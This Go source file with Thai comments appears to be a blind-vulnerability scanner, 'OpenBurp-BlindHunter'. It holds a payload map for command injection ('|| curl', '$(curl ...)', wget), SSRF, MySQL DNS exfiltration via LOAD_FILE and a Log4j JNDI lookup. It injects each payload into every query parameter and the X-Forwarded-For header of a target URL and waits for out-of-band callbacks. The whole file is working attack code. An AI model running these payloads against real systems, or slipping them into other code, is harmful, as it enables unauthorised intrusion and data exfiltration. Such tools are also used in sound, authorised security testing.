package main

import (
	"fmt"
	"net/http"
	"net/url"
	"time"
)

// OASTPayloads ชุดคำสั่งเจาะเกราะแบบ Blind
// %s จะถูกแทนที่ด้วย URL ของ Interactsh (เช่น xyz.oast.pro)
var blindPayloads = map[string]string{
	"RCE (Linux curl)":   "|| curl %s",
	"RCE (Linux wget)":   "|| wget %s",
	"RCE (Backticks)":    "; curl %s;",
	"SSRF (Basic)":       "http://%s",
	"Blind SQLi (MySQL)": "' AND LOAD_FILE(CONCAT('\\\\\\\\', '%s', '\\\\abc')) -- -", // DNS Exfiltration
	"Shell Injection":    "$(curl %s)",
	"Log4j (JNDI)":       "${jndi:ldap://%s/a}",
}

// RunOASTScan ฟังก์ชันหลักในการยิง Blind Attack
func RunOASTScan(targetURL string, oastURL string) {
	u, err := url.Parse(targetURL)
	if err != nil {
		return
	}

	queryParams := u.Query()
	if len(queryParams) == 0 {
		return
	}

	// ตัด Scheme (http/https) ออกจาก oastURL เพื่อใช้ใน payload บางตัว
	// เช่น oastURL = "xyz.oast.pro" (interactsh ให้มาแบบไม่มี http)

	fmt.Printf("🕵️‍♂️ Starting Blind Scan on: %s\n", targetURL)

	for param, values := range queryParams {
		_ = values[0] // ค่าเดิม

		for attackType, payloadTmpl := range blindPayloads {
			// สร้าง Payload จริง
			finalPayload := fmt.Sprintf(payloadTmpl, oastURL)

			// สร้าง URL ใหม่ที่ฝังระเบิดแล้ว
			newParams := url.Values{}
			for p, v := range queryParams {
				if p == param {
					newParams.Set(p, finalPayload)
				} else {
					newParams.Set(p, v[0])
				}
			}

			u.RawQuery = newParams.Encode()
			attackURL := u.String()

			fmt.Printf("   🔫 Shooting %s at parameter [%s]\n", attackType, param)

			// ยิงออกไป (ไม่ต้องรอ Response เพราะเราเช็คที่ OAST Server เอา)
			go func(url string, typeName string) {
				req, _ := http.NewRequest("GET", url, nil)
				req.Header.Set("User-Agent", "OpenBurp-BlindHunter/1.0")
				// ใส่ Payload ใน Header ด้วย (เผื่อเจอ Log4Shell)
				req.Header.Set("X-Forwarded-For", finalPayload)

				client := &http.Client{Timeout: 5 * time.Second} // Timeout เร็วๆ เพราะไม่สนผล
				client.Do(req)
			}(attackURL, attackType)
		}
	}
	fmt.Println("✅ Batch Sent! Waiting for callbacks...") // เพิ่มบรรทัดนี้ด้วย
}
